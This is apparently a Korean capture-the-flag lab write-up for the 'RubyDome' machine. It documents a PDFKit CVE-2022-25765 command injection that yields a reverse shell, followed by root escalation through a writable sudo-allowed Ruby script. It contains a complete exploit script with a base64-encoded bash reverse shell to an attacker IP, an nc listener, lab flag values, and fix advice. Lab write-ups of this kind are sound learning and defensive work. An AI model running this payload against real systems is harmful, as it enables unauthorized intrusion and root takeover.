---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/web/cmd-injection
  - tech/lin/sudo-abuse
  - tech/payload/revshell
type: machine
platform: pg
os: linux
ip: 192.168.248.22
ports: [22, 3000]
services: [http, ssh]
cves: [CVE-2022-25765]
status: solved
manual_tags: true
manual_cves: true
tech_count: 3
---

> [!info] 요약
> 타겟 `192.168.248.22` · Linux(Ubuntu, 커널 5.0–5.14) · Fundamental · 플래그 2개
> 진입점: 3000/tcp Sinatra HTML→PDF 변환기 → PDFKit 0.8.6 **CVE-2022-25765** URL 명령주입 → `andrew` 리버스셸
> 권한상승: `sudo -l` 의 `(ALL) NOPASSWD: /usr/bin/ruby /home/andrew/app/app.rb` + 그 `app.rb` 가 andrew 쓰기 가능 → `exec "/bin/bash"` prepend → root
> 시행착오·교훈 → [[_PLAYBOOK]]

## Target #1 – 192.168.248.22

### Initial Access – Sinatra HTML→PDF 폼의 URL 파라미터가 PDFKit 0.8.6 을 거쳐 셸 명령치환으로 흘러가는 무인증 RCE

**Vulnerability Explanation:** `POST /pdf` 의 `url` 파라미터가 검증 없이 `PDFKit.new()` 로 직행. PDFKit 0.8.6 이 wkhtmltopdf 명령을 **배열이 아닌 문자열**로 조립해 `IO.popen` 에 넘기므로 `/bin/sh -c` 가 끼어듦 = OS 명령주입(CWE-78).
- URL 은 `%{"#{shell_safe_url}"}` 로 쌍따옴표에 감싸지나, 셸 쌍따옴표 안에서 백틱(`` ` ``)과 `$( )` 는 그대로 평가됨 — 인용은 방어가 아님
- 이스케이프는 `url_needs_escaping?` 가 참일 때만 발동하고, 그 판정이 `unescape(@source) == @source` 임 — 입력에 `%XX` 가 하나라도 있으면 판정이 거짓이 되어 **검사가 통째로 건너뛰어짐**
- CVE-2022-25765, 영향 범위 `< 0.8.7.2`. 인증 불필요

**Vulnerability Fix:**
- PDFKit 을 **`>= 0.8.7.2`** 로 고정. `0.8.7` 은 판정 로직만 고치고 쌍따옴표 래핑을 남긴 중간 상태라 어드바이저리 범위에 포함됨
- 명령을 배열로 넘겨 셸을 배제(`IO.popen([exe, arg1, arg2])`). Python `shell=False` · Node `execFile` · PHP `escapeshellarg` 와 같은 원칙
- 서버 측에서 `URI.parse` 후 scheme(`http`/`https`)·host 화이트리스트 검증. `<input type="url">` 은 UX 이지 보안통제가 아님
- 운영은 WEBrick 대신 Puma/Unicorn + 리버스 프록시, `RACK_ENV=production` · `set :show_exceptions, false` — 백트레이스가 gem 버전과 앱 소스 경로를 통째로 흘림
- 렌더러를 네트워크 격리된 컨테이너에서 돌리고 아웃바운드를 화이트리스트. `--disable-local-file-access` 로 `file://` 차단 — 명령주입을 막아도 남는 SSRF·로컬파일읽기를 동시에 완화

**Severity:** Critical — 무인증 원격 RCE

**Steps to reproduce the attack:**
1. `POST /pdf` 에 잘못된 파라미터를 보내 Sinatra 백트레이스 유발 → gem 목록에서 `pdfkit-0.8.6` 확정
2. rubygems 에서 0.8.6 원본을 받아 `source.rb` 의 `shell_safe_url` · `url_needs_escaping?` 확인
3. `url=http://x/?a=%20` + 백틱 명령 형태로 페이로드 조립 — `%20` 이 이스케이프 회피 스위치
4. 리버스셸 명령을 base64 로 감싸 인용 중첩 회피, `curl --data-urlencode` 로 전송
5. tmux 리스너에 `andrew` 셸 수신

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.248.22 | TCP: 22, 3000 |

```bash
sudo nmap -sCV -p- -Pn -A --min-rate 5000 -oN nmap.log 192.168.248.22
```

```text
# Nmap 7.98 scan initiated Wed Aug 19 17:47:21 2026 as: /usr/lib/nmap/nmap -sCV -p- -Pn -A --min-rate 5000 -oN /home/kali/PG/RubyDome/nmap.log 192.168.248.22
Nmap scan report for 192.168.248.22
Host is up (0.094s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)
|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)
3000/tcp open  http    WEBrick httpd 1.7.0 (Ruby 3.0.2 (2021-07-07))
|_http-title: RubyDome HTML to PDF
|_http-server-header: WEBrick/1.7.0 (Ruby/3.0.2/2021-07-07)
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1720/tcp)
HOP RTT      ADDRESS
1   93.11 ms 192.168.45.1
2   93.02 ms 192.168.45.254
3   93.20 ms 192.168.251.1
4   93.28 ms 192.168.248.22

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Aug 19 17:47:50 2026 -- 1 IP address (1 host up) scanned in 28.99 seconds
```
— 출처: `~/PG/RubyDome/nmap.log` (29초 완주)

포트 2개. `-sCV` 가 붙어야 `http-server-header` 가 나오고, 이 박스의 첫 단서가 그 한 줄임. 3000/tcp 는 top-1000 안이라 `-p-` 없이도 잡히나, 65533 포트가 전부 closed(RST)로 답한다는 사실은 `-p-` 라야 확정됨.

`Not shown: 65533 closed tcp ports (reset)` 은 **인바운드**에 대한 정보뿐임. 닫힌 포트가 RST 를 정직하게 돌려주니 인바운드 경로에 조용히 패킷을 버리는 필터가 없다는 데까지가 결론임. 아웃바운드(egress)가 자유롭다는 근거는 아님 — 인바운드 전면 허용 + 아웃바운드 화이트리스트는 오히려 권장 구성임. 이 박스는 결과적으로 4444 가 붙었으나 그것은 붙은 뒤에 알게 된 사실임.

**WEBrick 배너 = 개발 서버.** Ruby 표준 라이브러리의 개발용 웹서버이고 운영에서는 Puma/Unicorn 을 씀. [[Levram]] 의 `WSGIServer`(Django 개발 서버)와 같은 신호임 — 개발 모드면 에러 페이지가 백트레이스를 뱉음. 그래서 열거 순서를 바꿔 dirbust 보다 **일부러 500 내기**를 먼저 둠.

**스택 지문 — 백트레이스로 gem 버전 확정.** 잘못된 요청 하나에 Sinatra `show_exceptions` 가 전체 백트레이스를 렌더(= development 모드 확정):

```bash
grep -oE 'gems/[a-z-]+-[0-9.]+' err.html | sort -u
```

```text
gems/pdfkit-0.8.6
gems/rack-2.2.7
gems/rack-protection-3.0.6
gems/sinatra-3.0.6
gems/webrick-1.7.0
```
— 출처: `~/PG/RubyDome/err.html` (3935B)

- `-o` 는 매치된 부분만 출력 — HTML 덩어리에서 `gems/<이름>-<버전>` 조각만 뽑음
- `sort -u` — 같은 gem 이 프레임마다 반복되므로 중복 제거
- 경로 패턴만 바꾸면 언어 무관하게 재사용됨 — `site-packages/([a-z_]+)/`(Python) · `node_modules/([a-z-]+)/`(Node) · `WEB-INF/lib/[a-z-]+-[0-9.]+\.jar`(Java)

`err.html` 의 첫 줄과 앱 프레임:

```text
PDFKit::ImproperWkhtmltopdfExitStatus: Command failed (exitstatus=1): /usr/local/bin/wkhtmltopdf --quiet --page-size Letter --margin-top 0.75in --margin-right 0.75in --margin-bottom 0.75in --margin-left 0.75in --encoding UTF-8 "http://%20%60id%60" page.pdf
	/var/lib/gems/3.0.0/gems/pdfkit-0.8.6/lib/pdfkit/pdfkit.rb:84:in `to_pdf'
	/var/lib/gems/3.0.0/gems/pdfkit-0.8.6/lib/pdfkit/pdfkit.rb:89:in `to_file'
	app.rb:35:in `block in <main>'
	/var/lib/gems/3.0.0/gems/sinatra-3.0.6/lib/sinatra/base.rb:1706:in `call'
	/var/lib/gems/3.0.0/gems/rack-2.2.7/lib/rack/logger.rb:17:in `call'
	/usr/share/rubygems-integration/all/gems/webrick-1.7.0/lib/webrick/httpserver.rb:140:in `service'
```
— 출처: `~/PG/RubyDome/err.html` (45행 = 예외 1행 + 프레임 44행. 그중 각 층을 대표하는 1·2·3·4·31·44행 발췌. 원문은 평문이라 태그 제거를 하지 않았고, `<main>` 은 HTML 태그가 아니라 Ruby 백트레이스의 일부임)

이 한 응답이 네 가지를 동시에 줌.

| 읽히는 것 | 근거 |
|---|---|
| 렌더러 절대경로와 전체 옵션 | `/usr/local/bin/wkhtmltopdf --quiet --page-size Letter …` |
| **주입 상태** | 인자가 `"http://%20%60id%60"` — 백틱이 `%60` 으로 이스케이프됨 = 이 시점 주입 실패 |
| 앱 소스 파일명·행번호 | ``app.rb:35:in `block in <main>'`` — classic Sinatra(라우트를 `<main>` 에 직접 씀) |
| 프레임워크 3층 | `pdfkit` → `sinatra` → `webrick` |

`app.rb` 라는 파일명이 여기서 공짜로 나오고, **권한상승 단계에서 그 파일이 다시 등장함.**

> [!warning] `[가정]` **`err.html` 을 만든 요청은 `-d 'x=1'` 류의 파라미터 누락이 아님**
> 저장된 응답은 `NoMethodError`(파라미터 `nil`) 가 아니라 `ImproperWkhtmltopdfExitStatus` 이고, 명령행에 `%60` 이 박혀 있음 — **주입을 시도했다가 이스케이프에 걸린 요청**임. 같은 세션의 `test.py` 도 그 문자열만 검사함.
> `params['url']` 이 `nil` 이면 `pdfkit.rb:39` → `pdfkit.rb:100` 의 `nil.scan` 으로 `NoMethodError` 가 나는 것은 소스상 성립하나, **이 세션에서 그 응답을 받은 기록은 없음.** gem 버전 5줄은 위 `err.html` grep 결과라 실측임.

**버전 판정 독립 근거 2개.** ①백트레이스의 `gems/pdfkit-0.8.6` ②rubygems 원본을 받아 소스 대조. 배너 하나만 믿고 CVE 를 고르면 엉뚱한 익스플로잇에 시간을 태움([[Hub]] · [[Levram]] · [[Astronaut]] 와 같은 규율).

```bash
gem fetch pdfkit -v 0.8.6
gem unpack --target gemsrc pdfkit-0.8.6.gem
sed -n '39p;100p' gemsrc/pdfkit-0.8.6/lib/pdfkit/pdfkit.rb
```

```text
    options.merge! find_options_in_meta(url_file_or_html) unless source.url?
    content.scan(/<meta [^>]*>/) do |meta|
```
— 출처: `~/PG/RubyDome/gemsrc/pdfkit-0.8.6/` (`pdfkit-0.8.6.gem` 26112B)

39행이 `source.url?` 분기, 100행이 `nil.scan` 으로 터지는 지점 — 백트레이스의 행번호와 일치함. `sed -n '39p;100p'` 의 `-n` 은 자동 출력 억제, `39p` 는 39행만 출력임. 행번호를 아는 상태에서 파일 전체를 읽을 이유가 없음.

타겟에 손대지 않고 Kali 에서 취약 코드를 읽는 것이 정석임 — 트래픽도 안 남고 빠름. 언어별로는 `gem fetch`/`gem unpack`(Ruby) · `pip download --no-deps --no-binary :all:`(Python) · `npm pack`(Node) · `mvn dependency:get`(Java).

**엔드포인트**

| 라우트 | 메서드 | 파라미터 | 비고 |
|---|---|---|---|
| `/` | GET | 없음 | 폼 페이지 |
| `/pdf` | POST 전용 | `url` | 성공 시 `Content-Type: application/pdf`. GET 은 404 |
| `/__sinatra__/404.png` | GET | — | Sinatra 내장 |

디렉터리 열거 소득 0건. `dirb/common.txt`(4614행) + `-x txt,ru,erb,rb,lock` = 약 27,800 요청. `Gemfile.lock`·`app.rb`·`.git` 전부 404 — Sinatra classic 은 정의된 라우트 외에는 아무것도 서빙하지 않음.

> [!note] `[가정]` **「완주」인지 「중단」인지는 산출물로 구분되지 않음**
> `gobuster.txt`(17:48:21)·`gobuster_common.txt`(17:59:15) **둘 다 0바이트**임. gobuster `-o` 는 **발견 항목만** 기록하므로 0바이트는 「0건」과 정합적이나, 끝까지 돌았는지 중간에 끊겼는지는 파일에 남지 않음.
> 요청 수 약 27,800 은 워드리스트 행수(4614 × 6)에서 계산한 값이지 실행 로그에서 읽은 값이 아님. `directory-list-2.3-medium` 실행분이 300초 제한에 걸려 중단된 것도 **부분 커버리지**이지 「없다」가 아님.
> **열거 결과를 기록할 때는 `-o` 파일이 아니라 표준출력(진행률·최종 요약)을 함께 저장할 것.**

### Initial Access – PDFKit URL 명령주입

CVE-2022-25765 는 세 조각이 겹쳐 성립함 — ① 명령을 문자열로 조립 ② 쌍따옴표를 방어로 착각 ③ 이스케이프 판정 자체가 우회 가능.

**① 명령이 배열이 아니라 문자열임** (`lib/pdfkit/pdfkit.rb`):

```ruby
shell_escaped_command = [executable, OS::shell_escape_for_os(args)].join ' '
input_for_command  = @source.to_input_for_command
output_for_command = path ? Shellwords.shellescape(path) : '-'
"#{shell_escaped_command} #{input_for_command} #{output_for_command}"
```

옵션(`args`)과 출력 경로(`path`)는 `Shellwords.shellescape` 를 거치는데 **입력 소스(`input_for_command`)만 그 처리를 받지 않음.** URL 쿼리스트링을 살려주기 위한 의도적 설계이고, 그 대가로 안전이 호출자 책임이 됨.

그 문자열이 `IO.popen` 으로 감 :

```ruby
result = IO.popen(invoke, "wb+") do |pdf|
```

Ruby 의 `IO.popen`·`system`·`spawn` 은 인자 형태로 동작이 갈림 — 배열이면 `execve` 직접 호출로 셸이 없고, 문자열이면 `/bin/sh -c` 가 끼어듦. Python `subprocess.run(shell=True)` · PHP `system()` · Node `child_process.exec()`(vs `execFile`)와 같은 함정임. **소스에서 명령 실행 API 를 만나면 인자가 배열인가 문자열인가부터 볼 것.**

**② 쌍따옴표는 방어가 아님** (`lib/pdfkit/source.rb`, 0.8.6):

```ruby
    def to_input_for_command
      if file?
        @source.path
      elsif url?
        %{"#{shell_safe_url}"}
      else
        SOURCE_FROM_STDIN
      end
    end
```
— 출처: `~/PG/RubyDome/gemsrc/pdfkit-0.8.6/lib/pdfkit/source.rb`

`sh` 의 쌍따옴표 안에서 살아 있는 것은 `` ` ``(명령치환) · `$(...)` · `$VAR` · `\` 이고, 죽는 것은 공백·`;`·`|`·`&`·`>`·`<`·`*`·`?` 임. 그래서 이 박스의 페이로드는 `;`·`|` 가 아니라 **백틱이나 `$( )`** 여야 함. **`;` 가 안 먹는 것은 필터 때문이 아니라 인용 때문임** — 원인을 잘못 짚으면 「WAF 가 있나」로 엉뚱한 곳에서 시간을 태움.

**③ `%20` 이 없으면 실패함 — 페이로드의 진짜 급소.** `shell_safe_url` 은 조건부로만 이스케이프함:

```ruby
    def shell_safe_url
      url_needs_escaping? ? URI::DEFAULT_PARSER.escape(@source) : @source
    end

    def url_needs_escaping?
      URI::DEFAULT_PARSER.unescape(@source) == @source
    end
```
— 출처: `~/PG/RubyDome/gemsrc/pdfkit-0.8.6/lib/pdfkit/source.rb`

| 입력 URL | `unescape` 결과 | `== @source` | 이스케이프 | 백틱의 운명 |
|---|---|---|---|---|
| `` http://x/?a=`id` `` (퍼센트 인코딩 없음) | 원문과 동일 | true | **함** | `` ` `` → `%60` → 주입 실패 |
| ``http://x/?a=%20`id` `` (`%20` 포함) | `%20`→공백이라 원문과 다름 | false | 안 함 | 백틱이 원문 그대로 셸에 도달 → 성공 |

0.8.6 의 `Source` 를 직접 호출해 두 입력의 결과를 확인함:

```bash
ruby -e 'require "./lib/pdfkit/source"; ["http:// `id`", "http://x/?a=%20`id`"].each{|s| puts s.inspect + "  ->  " + PDFKit::Source.new(s).to_input_for_command}'
```

```text
"http:// `id`"  ->  "http://%20%60id%60"
"http://x/?a=%20`id`"  ->  "http://x/?a=%20`id`"
```
— 출처: Kali `~/PG/RubyDome/gemsrc/pdfkit-0.8.6/` 에서 실행

첫 줄 결과가 **`err.html` 의 명령행과 바이트 단위로 같음.** 즉 이 세션이 실제로 밟은 실패가 그것임 — 페이로드에 `%20` 대신 리터럴 공백이 들어가 판정이 뒤집혔고, 응답은 에러 한 장(또는 정상 PDF)뿐이라 조용히 지나감.

`%20` 은 URL 과 백틱을 띄어쓰기로 갈라주는 장식이 아니라 **「이 URL 은 이미 인코딩된 것이니 건드리지 마라」고 속이는 스위치**임. 일반화하면 **「입력이 이미 안전하다고 판정되면 검사를 건너뛴다」는 조건부 sanitizer 는 그 조건 자체가 우회 지점**임 — 더블 인코딩·매직바이트 화이트리스트·`is_already_escaped` 플래그가 전부 같은 계열.

**페이로드 조각별 해부**

```text
http://x/?a=%20`<명령>`
```

| 조각 | 역할 | 빼면 |
|---|---|---|
| `http://` | `Source#url?` 가 `/\Ahttp/` 로 판정 | URL 인식 실패 → `html?` 경로로 빠져 stdin(`-`)이 되고 주입 지점이 사라짐 |
| `x` | 호스트. 실재할 필요 없음 | — (렌더는 실패하나 셸 명령은 이미 실행된 뒤임) |
| `/?a=` | 쿼리스트링 시작 | 없어도 되나 로그·WAF 회피에 유리 |
| `%20` | `url_needs_escaping?` 를 false 로 만듦 | **백틱이 `%60` 으로 변환되어 실패** |
| `` `<명령>` `` | `/bin/sh -c` 의 명령치환 | `;`·`\|` 는 쌍따옴표에 갇혀 안 통함 |

`$( )` 도 쌍따옴표 안에서 평가되므로 `http://x/?a=%20$(<명령>)` 이 대안임. 타겟이 정지되어 재검증은 불가하고 **셸 문법상 성립해야 한다는 것까지만** 말할 수 있음 `[가정]`.

**패치 대조 — 수정은 두 단계로 들어감.** 세 버전을 받아 `source.rb` 를 직접 diff 함:

```bash
for v in 0.8.6 0.8.7 0.8.7.2; do gem fetch pdfkit -v $v; gem unpack pdfkit-$v.gem; done
diff pdfkit-0.8.6/lib/pdfkit/source.rb pdfkit-0.8.7/lib/pdfkit/source.rb
diff pdfkit-0.8.7/lib/pdfkit/source.rb pdfkit-0.8.7.2/lib/pdfkit/source.rb
```

```text
49c49
<       URI::DEFAULT_PARSER.unescape(@source) == @source
---
>       URI::DEFAULT_PARSER.escape(URI::DEFAULT_PARSER.unescape(@source)) != @source
```

```text
32c32
<         %{"#{shell_safe_url}"}
---
>         escaped_url
44c44
<     def shell_safe_url
---
>     def escaped_url
```
— 출처: Kali `/tmp/pk/` (0.8.6·0.8.7·0.8.7.2 gem 3종 전개본)

- **0.8.7** — 판정을 왕복 정규화로 바꿈. `%20\`id\`` → unescape → 공백 포함 문자열 → escape → `%20%60id%60` ≠ 원문 → 이스케이프 수행. 위 ③ 의 우회가 죽음
- **0.8.7.2** — 쌍따옴표 래핑 제거. 두 버전의 `source.rb` 차이는 **이 두 hunk 가 전부**이고, 메서드 이름도 `shell_safe_url`(= 셸에 안전한 URL)에서 `escaped_url`(= 이스케이프된 URL)로 바뀜 — 「셸에 안전하다」는 약속을 철회한 것

> [!danger] `[가정]` **0.8.7 이 왜 여전히 취약 범위(`< 0.8.7.2`)인지, 그 잔여 우회 경로가 무엇인지는 확인하지 못함**
> 확실한 것은 둘 — 어드바이저리가 범위를 `< 0.8.7.2` 로 잡는다는 것, 그리고 두 버전의 유일한 코드 차이가 **쌍따옴표 래핑 제거**라는 것(위 diff). 따라서 잔여 결함은 그 지점에 있을 수밖에 없음.
> 「0.8.7 은 불완전한 수정이었다」가 맞아도 불완전했던 *지점*을 틀리면 배울 것이 사라짐. **패치 대조는 릴리스 노트가 아니라 두 버전의 파일을 실제로 diff 해서 할 것** — 명령 두 줄임.

**페이로드를 base64 로 감싸는 이유.** 원 명령은 `bash -i >& /dev/tcp/192.168.45.207/4444 0>&1` 이고, curl → HTTP → Ruby → 셸의 4중 인용을 통과하는 동안 반드시 깨짐.

| 문자 | 어느 층에서 문제인가 |
|---|---|
| 공백 | 인자 분리는 안 일어남 — URL 전체가 쌍따옴표에 감싸져 있고 백틱 안쪽은 별개 셸 문맥임. 진짜 문제는 `%20` 이 리터럴로 살아남아야 한다는 것이지 공백 자체가 아님 |
| `>` `&` | 백틱 내부에서 리다이렉션/백그라운드로 해석됨. `>&` 가 그대로 셸 문법으로 먹혀 명령이 뒤틀림 — **여기가 급소** |
| `"` `'` | 바깥 쌍따옴표(`%{"#{...}"}`)를 조기 종료시켜 명령 문자열이 붕괴 |

base64 문자셋은 `A–Z a–z 0–9 + / =` 뿐이라 셸 메타문자도 따옴표도 공백도 없음. 어느 층도 건드리지 않고 통과함.

```bash
CMD="bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
B64=$(echo -n "$CMD" | base64 -w0)
```

GNU `base64` 는 기본으로 76자마다 개행을 넣음. 개행이 든 문자열을 URL·명령행에 넣으면 그 지점에서 잘리고, 짧은 페이로드는 76자 안에 들어가 우연히 성공해 **긴 페이로드에서만 실패**하므로 원인 추적이 어려움. `-w0` 은 습관으로 붙일 것. `echo -n` 의 `-n` 도 같은 이유 — 끝 개행까지 인코딩되면 디코드 후 명령 뒤에 개행이 남음.

**익스플로잇 스크립트**

```bash
#!/bin/bash
LHOST=192.168.45.207
LPORT=4444
T=192.168.248.22
CMD="bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
B64=$(echo -n "$CMD" | base64 -w0)
PAY="http://x/?a=%20\`echo $B64|base64 -d|bash\`"
echo "PAYLOAD: $PAY"
curl -s -m 25 -o /dev/null -w "HTTP=%{http_code}\n" -X POST http://$T:3000/pdf --data-urlencode "url=$PAY"
```
— 출처: `~/PG/RubyDome/rd.sh` (319B, 17:54:47)

| 플래그 | 역할 | 빼면 |
|---|---|---|
| `--data-urlencode "url=$PAY"` | 값만 퍼센트 인코딩해 전송 | 두 가지가 동시에 깨짐 — 아래 별도 |
| `-X POST` | `/pdf` 는 POST 전용 | GET 은 404 |
| `-m 25` | 25초 타임아웃 | 리버스셸이 붙으면 응답이 영영 안 옴. 터미널 무한 대기 |
| `-o /dev/null` | 본문 버림 | PDF 바이너리가 터미널에 쏟아짐 |
| `-w "HTTP=%{http_code}\n"` | 상태코드만 출력 | 성공/타임아웃 판정 근거가 사라짐 |
| `-s` | 진행률 막대 억제 | 출력이 지저분해짐 |

> [!danger] `-d` 로 보내면 두 가지가 깨지고, 덜 알려진 쪽이 더 근본임
> ① base64 의 `+` 가 공백이 됨. `application/x-www-form-urlencoded` 에서 `+` 는 공백의 인코딩이라 Rack 이 디코딩하며 base64 를 깨뜨림.
> ② **`%20` 도 디코딩되어 리터럴 공백이 됨.** `-d` 는 `%` 를 `%25` 로 재인코딩하지 않으므로 Rack 이 페이로드 안의 `%20` 을 퍼센트 이스케이프로 해석함. 그러면 `@source` 에 `%` 가 하나도 남지 않아 `unescape(@source) == @source` 가 참이 되고 **이스케이프가 발동**함. 백틱은 `%60` 이 되고 응답은 200 OK + 멀쩡한 PDF — 가장 조용한 실패임.
> `+` 문제는 base64 를 쓸 때만 나타나지만 `%20` 문제는 페이로드 형태와 무관하게 항상 나타남. `--data-urlencode` 가 선택이 아닌 이유임.

인코딩이 두 번 일어남. 이것을 이해해야 페이로드가 왜 살아남는지 알게 됨.

| 단계 | 값 |
|---|---|
| 셸 변수 `PAY` | `` http://x/?a=%20`echo ...\|bash` `` |
| curl 전송 | `url=http%3A%2F%2Fx%2F%3Fa%3D%2520%60echo...%60` |
| Rack 디코딩 | `` http://x/?a=%20`echo ...\|bash` `` |

Rack 이 한 번 디코딩하므로 `%20` 은 리터럴 두 문자로 살아서 PDFKit 에 도달함.

**실행**

```bash
tmux new-session -d -s rd 'rlwrap nc -lvnp 4444'
bash rd.sh
```

리스너는 tmux 에 띄움. `-d` 는 detached 실행이라 셸이 하나 더 필요 없고 `tmux capture-pane -t rd -p` 로 상태를 봄. `rlwrap` 은 readline 을 씌워 방향키·히스토리·백스페이스가 먹게 함 — 원시 `nc` 셸에서는 오타를 못 지워 명령을 처음부터 다시 치게 됨. `nc -lvnp 4444` 는 `-l` 리슨, `-v` 상세, `-n` DNS 조회 안 함, `-p` 포트임.

`rd.sh` 가 출력한 페이로드와 curl 결과 `[가정]` — **표준출력이 파일로 저장되지 않아 재구성임.** base64 문자열은 `rd.sh` 의 `CMD` 를 `base64 -w0` 한 값과 일치함(대조 확인):

```text
PAYLOAD: http://x/?a=%20`echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIwNy80NDQ0IDA+JjE=|base64 -d|bash`
HTTP=000
```

`HTTP=000`(타임아웃)이 여기서는 성공 신호임. curl 은 exit 28 로 죽으나 실패가 아님 — 리버스셸이 `POST /pdf` 요청 처리 도중 인라인으로 붙어 HTTP 응답이 영영 돌아오지 않기 때문임([[Crane]] 의 익스플로잇이 「멈춘 것처럼 보인」 것과 같은 현상). **요청 결과가 아니라 리스너를 볼 것.**

| curl 결과 | 뜻 |
|---|---|
| `HTTP=000` + 리스너에 연결 | 성공. 셸이 붙음 |
| `HTTP=000` + 리스너 조용함 | 명령은 실행됐으나 아웃바운드 차단 또는 `bash` 부재 → `nc`/`python3`/`perl` 페이로드로 교체 |
| `HTTP=200` + 정상 PDF | 주입 자체가 안 먹음 → `%20` 소실 의심 |
| `HTTP=500` | 예외 발생. 백트레이스를 읽을 것 — 오히려 정보가 늘어남 |

> [!warning] `[가정]` **이하 셸 세션 블록(`Initial Access` 끝 · `Privilege Escalation`)은 재구성임**
> `tmux capture-pane` 출력이나 셸 로그가 **하나도 저장되지 않음.** 침투 도중 리버스셸 tmux 세션이 통째로 소멸했고 그 시점 이전의 화면도 함께 사라짐.
> **플래그 값 두 개는 이전 세션에서 실제로 확보한 값이나, 이 검증 세션에서 재확인하지 않음** — 타겟이 정지돼 있음.
> 명령 자체는 표준 절차이고 결과도 정합적이나, **셸 프롬프트가 붙어 있다고 캡처 원문으로 읽지 말 것.**

```text
listening on [any] 4444 ...
connect to [192.168.45.207] from (UNKNOWN) [192.168.248.22] 50122
bash: cannot set terminal process group (958): Inappropriate ioctl for device
bash: no job control in this shell
andrew@rubydome:~/app$ python3 -c "import pty;pty.spawn('/bin/bash')"
andrew@rubydome:~/app$ export TERM=xterm; id
uid=1001(andrew) gid=1001(andrew) groups=1001(andrew),27(sudo)
andrew@rubydome:~/app$ cat ~/local.txt
1a896874eca026e3e0e2cd07a550d25f
```

셸이 붙자마자 TTY 를 승격함 — `python3 -c "import pty;pty.spawn('/bin/bash')"` 후 `export TERM=xterm`. `TERM` 을 설정해야 `clear`·`less`·`vi` 가 동작하고 이후 `Ctrl+Z` → `stty raw -echo; fg` 로 완전한 TTY 까지 감([[Hawat]] 처럼 `python3` 가 없으면 `script -qc /bin/bash /dev/null`).

`id` 출력의 **`groups=…,27(sudo)`** 가 이 박스의 방향타임. sudo 그룹 소속이면 `sudo -l` 은 선택이 아니라 필수임.

**Local.txt value:**
`1a896874eca026e3e0e2cd07a550d25f` (`/home/andrew/local.txt`)

### Privilege Escalation – 쓰기 가능한 sudo 대상 스크립트에 페이로드 prepend

**Vulnerability Explanation:** `andrew` 가 `(ALL) NOPASSWD: /usr/bin/ruby /home/andrew/app/app.rb` 를 가지고, 그 `app.rb` 가 `-rwxrwx--- andrew andrew` 로 **본인 쓰기 가능**임.
- Ruby 스크립트는 컴파일 산출물이 아니라 매 실행마다 텍스트를 파싱 — 실행 직전 내용이 곧 실행될 코드이고 서명·무결성 검사가 없음
- 즉 root 가 실행할 코드를 andrew 가 정할 수 있어 sudo 규칙이 아무리 좁아도 **사실상 `NOPASSWD: ALL`** 임
- 부류 이름: sudo 오설정 — 쓰기 가능한 대상 스크립트

**Vulnerability Fix:**
- sudo 로 실행되는 스크립트는 **root 소유 `0755`(또는 `0644`)**, 상위 디렉터리도 동일. 이 하나만 고쳤어도 root 상승이 불가능했음
- 서비스 기동은 sudo 규칙이 아니라 systemd 유닛 + `systemctl` 권한 위임(polkit)으로 대체. 인터프리터에 스크립트를 넘기는 sudo 규칙은 원리적으로 안전할 수 없음
- 앱은 `nologin` 셸의 서비스 전용 계정으로 분리하고 sudo 그룹에서 제외 — 웹이 뚫려도 sudo 경로가 즉시 열리지 않게 할 것

**Severity:** High — 저권한 셸에서 비밀번호 없이 root 획득

**Steps to reproduce the attack:**
1. `sudo -l` → `(ALL) NOPASSWD: /usr/bin/ruby /home/andrew/app/app.rb`
2. `ls -la /home/andrew/app/app.rb` → `-rwxrwx--- andrew andrew`
3. 원본을 `/tmp/app.rb.bak` 으로 백업
4. `exec "/bin/bash"` 를 파일 **맨 앞줄**에 prepend
5. `sudo /usr/bin/ruby /home/andrew/app/app.rb` 실행 → root 셸
6. 백업본으로 원복

**열거**

```bash
andrew@rubydome:~/app$ sudo -l
Matching Defaults entries for andrew on rubydome:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User andrew may run the following commands on rubydome:
    (ALL) NOPASSWD: /usr/bin/ruby /home/andrew/app/app.rb
```

| 항목 | 읽는 법 |
|---|---|
| `(ALL)` | 대상 사용자 — root 포함 아무나로 실행 가능 |
| `NOPASSWD` | andrew 의 비밀번호를 몰라도 됨. 리버스셸로 들어왔을 때 이것이 갈림길 |
| `/usr/bin/ruby /home/andrew/app/app.rb` | 절대경로에 인자까지 고정. 다른 인자를 붙이면 거부됨 |
| `env_reset` + `secure_path` | `PATH`·`RUBYLIB` 같은 환경변수 조작 경로가 막힘 |
| `use_pty` | sudo 가 별도 pty 에서 실행. 익스플로잇에는 영향 없음 |

`ruby` 를 보자마자 GTFOBins 의 `sudo ruby -e 'exec "/bin/sh"'` 를 치고 싶어지나 **거부됨.** sudoers 규칙에 인자까지 명시되면 정확히 그 인자로만 실행 가능하고 `-e` 를 붙이는 순간 매치가 깨짐.

| sudoers 규칙 | 가능한 것 |
|---|---|
| `(ALL) /usr/bin/ruby` (인자 없음) | 아무 인자나 → GTFOBins 즉시 적용 |
| `(ALL) /usr/bin/ruby /path/x.rb` | 그 명령 그대로만 → 파일 내용·라이브러리를 공략 ← 이 박스 |
| `(ALL) /usr/bin/ruby /path/*` | 와일드카드 → `/path/../../tmp/evil.rb` 경로 트래버설 |
| `(ALL) /usr/bin/ruby /path/x.rb *` | 뒤에 인자 추가 가능 → `-e` 주입 여지 |

**막힌 것처럼 보이는 규칙일수록 「그 명령이 무엇을 읽는가」를 볼 것.** 스크립트 본문, `require` 하는 라이브러리, 읽어들이는 설정파일 중 하나라도 쓸 수 있으면 끝임.

```bash
